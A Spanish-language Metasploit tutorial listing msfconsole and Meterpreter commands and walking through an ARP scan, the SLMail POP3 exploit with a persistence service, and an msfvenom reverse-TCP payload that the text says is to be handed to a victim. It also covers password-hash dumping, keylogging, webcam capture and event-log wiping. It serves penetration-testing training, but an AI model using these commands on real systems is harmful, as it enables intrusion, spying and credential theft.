
Metasploit es un framework de pruebas de penetración de código abierto ampliamente utilizado por investigadores de seguridad y profesionales de la seguridad cibernética para llevar a cabo evaluaciones de vulnerabilidades, pruebas de penetración y desarrollo de exploits. Ofrece una amplia gama de herramientas y funcionalidades para descubrir, explotar y mitigar vulnerabilidades en sistemas informáticos y redes.



### Módulos y Funcionalidades

En Metasploit, los módulos se encuentran en la ruta `/usr/share/metasploit-framework/modules` en Debian o en `/opt/metasploit/modules` en Arch. La mayoría de los scripts están escritos en Ruby.

##### Comandos básicos:

```bash
msfconsole
```

De esta forma, podemos iniciar Metasploit.


```bash
msf6 > workspace -a nombre
```

Al ejecutar este comando, se crea un nuevo espacio de trabajo con el nombre que has especificado, lo que te permite comenzar a trabajar y organizar tus actividades en ese entorno específico.


```bash 
msf6 > worksape nombre
```

Con este comando, puedes cambiar de un espacio de trabajo a otro dentro de Metasploit.


```bash
msf6 > search [palabra clave]
```

Busca todos los módulos en la base de datos de Metasploit que contengan la palabra clave en su nombre, descripción u otras metainformaciones.

```bash
msf6 > search platform:"SO"
```

Este comando busca en Metasploit todos los módulos que tienen como plataforma el sistema operativo especificado, por ejemplo, `"windows"`, `"linux"`, `"unix"`, etc.


```bash
msf6 > search type:"tipo"
```

  
El comando que proporcionaste busca en Metasploit todos los módulos que tienen el tipo especificado, como por ejemplo `"exploit"`, `"auxiliary"`, `"payload"`, etc.

```bash
msf6 tipo_modulo(ruta_modulo) > use ruta_modulo 
```


Esto se utiliza para cargar un módulo específico en la consola de Metasploit para su uso.

```bash
msf6 tipo_modulo(ruta_modulo) > show options
```

Se utiliza para mostrar las opciones disponibles y sus valores actuales (algunos de los cuales pueden ser necesarios o no) para el módulo que está cargado en la consola de Metasploit. Estas opciones pueden ser configuradas para ajustar el comportamiento del módulo antes de ejecutarlo.


```bash
msf6 tipo_modulo(ruta_modulo) > show advanced options
```

Muestra las opciones avanzadas disponibles para el módulo que está actualmente cargado en la consola de Metasploit. Estas opciones avanzadas suelen ser configuraciones más detalladas y específicas que pueden ajustar aún más el comportamiento del módulo durante su ejecución.


```bash
msf6 tipo_modulo(ruta_modulo) > set VERBOSE true
```


Establece el nivel de detalle de la salida de información durante la ejecución de un módulo o comando. Cuando estableces `VERBOSE` en `true`, Metasploit mostrará información detallada y adicional durante la ejecución, lo que puede ser útil para comprender mejor lo que está ocurriendo detrás de escena


```bash
msf6 tipo_modulo(ruta_modulo) > set THREADS cantidad 
```

Se utiliza para establecer el número de hilos que serán utilizados al ejecutar un módulo específico en Metasploit.


```bash
msf6 tipo_modulo(ruta_modulo) > set RHOST ip/cidr
```

Este comando se utiliza para establecer la dirección del host remoto en un módulo específico en Metasploit.


```bash
msf6 tipo_modulo(ruta_modulo) > info 
```

Se utiliza para mostrar información detallada sobre el módulo que está actualmente cargado en la consola de Metasploit. Proporciona detalles sobre el módulo, incluyendo su nombre, descripción, autor, versión, referencias y cualquier otro detalle relevante.


```bash
msf6 tipo_modulo(ruta_modulo) > info -d 
```

Este comando proporciona información detallada sobre todos los módulos disponibles en la base de datos de Metasploit. Esto incluye detalles como el nombre, la descripción, el autor, las referencias y otros metadatos relevantes de todos los módulos disponibles en la base de datos.


```bash
msf6 tipo_modulo(ruta_modulo) > run
```


Si tienes un módulo cargado y has configurado todos los parámetros necesarios, como la dirección IP del objetivo u otras opciones relevantes, puedes ejecutar el módulo utilizando el comando `run`.


```bash
msf6 tipo_modulo(ruta_modulo) > hosts
```

Este comando te permite ver todos los hosts que Metasploit tiene almacenados en su base de datos.


```bash
msf6 tipo_modulo(ruta_modulo) > hosts -C campos 
```

se utiliza para mostrar una lista de hosts almacenados en la base de datos de Metasploit, permitiendo especificar los campos que deseas mostrar para cada host como por ejemplo filtrar por  `address`,`mac`,`os_name`,`name`,`info`,`services`, `vulns`.


```bash
msf6 tipo_modulo(ruta_modulo) > db_import archivo.xml
```

Supongamos que tienes un archivo XML que contiene información sobre los puertos abiertos de una serie de hosts. Puedes importar estos resultados a la base de datos de Metasploit con el anterior comando.


```bash
msf6 tipo_modulo(ruta_modulo) > services
```

Se utiliza para mostrar una lista de servicios que están almacenados en la base de datos de Metasploit. Estos servicios pueden incluir información sobre los puertos abiertos, los protocolos utilizados y otra información relevante recopilada durante escaneos de red o pruebas de penetración.



```bash
msf6 tipo_modulo(ruta_modulo) > db_nmap ip
```

Se utiliza para realizar un escaneo de puertos utilizando la herramienta Nmap y luego importar los resultados del escaneo a la base de datos de Metasploit.


```bash
msf6 tipo_modulo(ruta_modulo) > check
```

  
Este comando se utiliza para verificar si el objetivo especificado es vulnerable al exploit o módulo cargado en la consola de Metasploit.

```bash
msf6 tipo_modulo(ruta_modulo) > show targets
```

Se usa para mostrar una lista de los objetivos disponibles y sus respectivos números de índice en el módulo cargado.

```bash
msf6 tipo_modulo(ruta_modulo) > show payloads
```

Muestra una lista de los payloads (cargas útiles) disponibles para el módulo cargado.


```bash
msfvenom -l encoders
```

Al ejecutar este comando, se mostrará una lista de todos los encoders disponibles, junto con sus nombres y una breve descripción de su funcionalidad.


```bash
msfvenom -l payloads
```

Esto te proporcionará una lista de todos los payloads disponibles en tu instalación de Metasploit.

```bash
msf6 tipo_modulo(ruta_modulo) > exploit
```

Se utiliza para ejecutar el exploit que está cargado en la consola de Metasploit.


```bash
msf6 tipo_modulo(ruta_modulo) > sessions
```

Se utiliza para mostrar una lista de todas las sesiones de Meterpreter activas.

```bash
msf6 tipo_modulo(ruta_modulo) > sessions id_sesion
```

Se utiliza para cambiar el enfoque a una sesión de Meterpreter específica en lugar de mostrar una lista de todas las sesiones activas.


```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform SO LHOST=ip LPORT=puerto -f exe -o archivo.exe
```

Este comando genera un payload de Meterpreter para Windows que establecerá una conexión TCP inversa con el host de Metasploit especificado, utilizando la dirección IP y el puerto especificados, y guarda el payload generado en un archivo ejecutable.


# Comandos de Meterpreter 

1. **help**: Muestra una lista de comandos disponibles en Meterpreter y proporciona información sobre su uso.

2. **sysinfo**: Muestra información detallada sobre el sistema comprometido, incluyendo el nombre del sistema operativo, la arquitectura del procesador y la versión del kernel.

3. **shell**: Abre una shell interactiva en el sistema comprometido, lo que permite ejecutar comandos del sistema operativo directamente desde Meterpreter.

4. **ps**: Muestra una lista de los procesos en ejecución en el sistema comprometido, incluyendo sus identificadores de proceso (PID) y nombres.

5. **getuid**: Muestra el identificador de usuario (UID) del usuario actualmente autenticado en el sistema comprometido.

6. **getsystem**: Intenta obtener privilegios elevados en el sistema comprometido, escalando los privilegios del usuario actual al nivel de sistema.

7. **hashdump**: Recupera y muestra las contraseñas almacenadas en el sistema comprometido en formato de hash.

8. **upload**: Permite cargar un archivo desde tu máquina local al sistema comprometido.

9. **download**: Permite descargar un archivo del sistema comprometido a tu máquina local.

10. **execute**: Ejecuta un comando en el sistema comprometido sin abrir una shell interactiva.

12. **load**: Se utiliza para cargar un módulo específico en la sesión actual de Meterpreter, lo que permite expandir la funcionalidad de la sesión.
    - **load -l**: Lista todos los módulos disponibles para cargar.
    - **load espia**: Carga el módulo de espionaje para realizar actividades de vigilancia.
    - **load kiwi**: Carga el módulo Kiwi en la sesión actual
        - **creds_all**: Muestra todas las credenciales obtenidas durante la sesión.
    - **load powershell**: Carga el módulo de PowerShell en la sesión actual.
        - **powershell_shell**: Inicia una shell de PowerShell en el sistema comprometido.

14. **screengrab**: Captura una imagen de la pantalla del sistema comprometido y la guarda en el sistema de ataque.

15. **uictl**: Controla la interfaz gráfica de usuario (GUI) del sistema comprometido, permitiendo acciones como la manipulación de ventanas y la simulación de eventos de entrada.
    - **uictl disable keyboard/mouse**: Deshabilita el teclado/ratón del sistema comprometido.
    - **uictl enable keyboard/mouse**: Habilita el teclado/ratón del sistema comprometido.

17. **keyscan_start**: Inicia la captura de pulsaciones de teclas en el sistema comprometido.

18. **keyscan_dump**: Muestra las pulsaciones de teclas capturadas durante la sesión actual.

19. **keyscan_stop**: Detiene la captura de pulsaciones de teclas en el sistema comprometido.

20. **background**: Cambia la sesión de Meterpreter actual al segundo plano, permitiéndote volver al prompt de Metasploit.

21. **kill**: Termina una sesión de Meterpreter activa.

22. **clearev**: Borra los registros de eventos del sistema comprometido para ocultar actividades sospechosas.

23. **migrate**: Mueve el proceso Meterpreter actual a otro proceso en ejecución en el sistema comprometido para evadir la detección y persistir.

24. **screenshot**: Captura una captura de pantalla del escritorio del sistema comprometido.

25. **webcam_snap**: Captura una fotografía utilizando la webcam conectada al sistema comprometido.


# Ejemplos de uso 


### Arp scan

El módulo ARP (Address Resolution Protocol) de Metasploit se utiliza para realizar operaciones relacionadas con la resolución de direcciones MAC en una red local. Aquí tienes un ejemplo de cómo usar el módulo ARP en Metasploit:

1. **Identificar el Módulo ARP**:

   Primero, identifica el módulo ARP en Metasploit utilizando el comando `search`:

   ```bash
   msf6 > search arp
   ```

   Esto te mostrará una lista de todos los módulos relacionados con ARP disponibles en Metasploit.

2. **Seleccionar y Configurar el Módulo**:

   Una vez identificado el módulo que deseas utilizar, cárgalo y configúralo según tus necesidades:

   ```bash
   msf6 > use auxiliary/scanner/discovery/arp_sweep
   ```

   Configura las opciones del módulo, como el rango de direcciones IP que deseas escanear:

   ```bash
   msf6 auxiliary(scanner/discovery/arp_sweep) > set RHOSTS ip/cidr
   ```

   En este ejemplo, estamos configurando el módulo para realizar un escaneo ARP en el rango de direcciones IP de la red local.

3. **Ejecutar el Módulo**:

   Una vez configurado el módulo, ejecútalo con el comando `run`:

   ```bash
   msf6 auxiliary(scanner/discovery/arp_sweep) > run
   ```

   Esto iniciará el escaneo ARP en el rango de direcciones IP especificado y mostrará los resultados.

El módulo ARP de Metasploit es útil para descubrir hosts en una red local y puede ser utilizado como parte de una fase de reconocimiento para identificar dispositivos conectados a la red y sus direcciones MAC asociadas.


### Persistencia 

El módulo `exploit/windows/pop3/seattlelab_pass` de Metasploit se utiliza para aprovecharnos de una vulnerabilidad de desbordamiento del búfer no autenticado en el servidor POP3 de Seattle Lab Mail 5.5 al enviar una contraseña con una longitud excesiva. Aquí tienes un ejemplo de cómo utilizar este módulo para establecer persistencia en un objetivo:

1. **Identificar el Módulo**:

   Primero, identifica el módulo `exploit/windows/pop3/seattlelab_pass` en Metasploit utilizando el comando `search`:

   ```bash
   msf6 > search seattlelab_pass
   ```

   Esto te mostrará información sobre el exploit si está disponible en tu base de datos de Metasploit.

2. **Configurar las Opciones del Módulo**:

   Una vez identificado el módulo, cárgalo y configura las opciones necesarias. Esto incluye configurar la opcion  `RHOSTS` (la dirección IP del objetivo). Por ejemplo:

   ```bash
   msf6 > use exploit/windows/pop3/seattlelab_pass
   msf6 exploit(windows/pop3/seattlelab_pass) > set RHOSTS ip_victima 
   ```

   Asegúrate de ajustar `ip_victima` al objetivo específico.

3. **Ejecutar el Exploit**:

   Una vez configurado el módulo, ejecuta el exploit con el comando `exploit`:

   ```bash
   msf6 exploit(windows/pop3/seattlelab_pass) > exploit
   ```

   Esto intentará aprovechar la vulnerabilidad en el servicio POP3 en el objetivo para establecer una reverse shell por medio de una sesion de meterpreter .

4. **Generar persistencia**

   Una vez establecida nuestra sesión de Meterpreter, el primer paso para generar persistencia es colocar la sesión en segundo plano.

   ```bash
   (Meterpreter 1)(C:\Program Files\SLmail\System) > background
   ```

   Luego, buscamos el exploit necesario para generar la persistencia.

   ```bash
   msf6 exploit(windows/pop3/seattlelab_pass) > search persistence platform:"windows"
   ```

   Una vez identificado el exploit, lo cargamos y configuramos las opciones necesarias. Por ejemplo, configuramos la opción `SESSION` en uno, ya que solo tenemos una sesión activa.

   ```bash
   msf6 exploit(windows/pop3/seattlelab_pass) > use exploit/windows/local/persistence_service
   msf6 exploit(windows/local/persistence_service) > set SESSION 1
   ```

   Con todo configurado, ejecutamos el exploit con el comando `run`.

   ```bash
   msf6 exploit(windows/local/persistence_service) > run
   ```

   Esto creará un servicio en la máquina y obtendremos acceso al sistema Windows. Si deseamos establecer una sesión de escucha, primero cargamos el exploit del listener y configuramos las opciones necesarias, como el payload, que en este caso establecerá una conexión de retorno hacia el atacante a través de TCP. Luego, configuramos la opción `LHOST` para indicar la dirección IP de nuestra máquina atacante.

   ```bash
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
   msf6 exploit(multi/handler) > set LHOST ip
   ```

   Con esto configurado, ejecutamos el listener con el comando `run`.

   ```bash
   msf6 exploit(multi/handler) > run
   ```

   Esto nos permitirá automáticamente ingresar a una sesión con una shell.
### Creación de Payload de Meterpreter para Windows

1. **Creación del Payload**

	Primero generamos nuestro payload específicamente diseñado para sistemas Windows. Este payload establecerá una conexión de retorno hacia el atacante a través de TCP, utilizando la dirección IP y el puerto especificados. El payload será empaquetado en un archivo ejecutable (EXE) con el nombre indicado como se muestra a continuación:

	```bash
	msfvenom -p windows/meterpreter/reverse_tcp --platform SO LHOST=ip LPORT=puerto -f exe -o archivo.exe
	```

	Una vez generado, este payload debe ser compartido con la víctima.

2. **Configuración del Listener**

	Ingresamos a Metasploit para luego cargar el exploit del listener. Además, configuramos las opciones para que este funcione correctamente. Específicamente, configuramos el payload que queremos utilizar, luego establecemos `LHOST`, donde indicamos nuestra dirección IP de atacante, y finalmente `LPORT`, donde indicamos el puerto donde estaremos en escucha.

	```bash
	msf6 > use exploit/multi/handler
	msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
	msf6 exploit(multi/handler) > set LHOST ip
	msf6 exploit(multi/handler) > set LPORT puerto
	```

	Con todo configurado, ejecutamos el listener con el comando `run`.

	```bash
	msf6 exploit(multi/handler) > run
	```

	Cuando la víctima ejecute el payload, recibiremos una reverse shell en nuestra máquina, lo que nos permitirá obtener control total sobre la máquina comprometida.



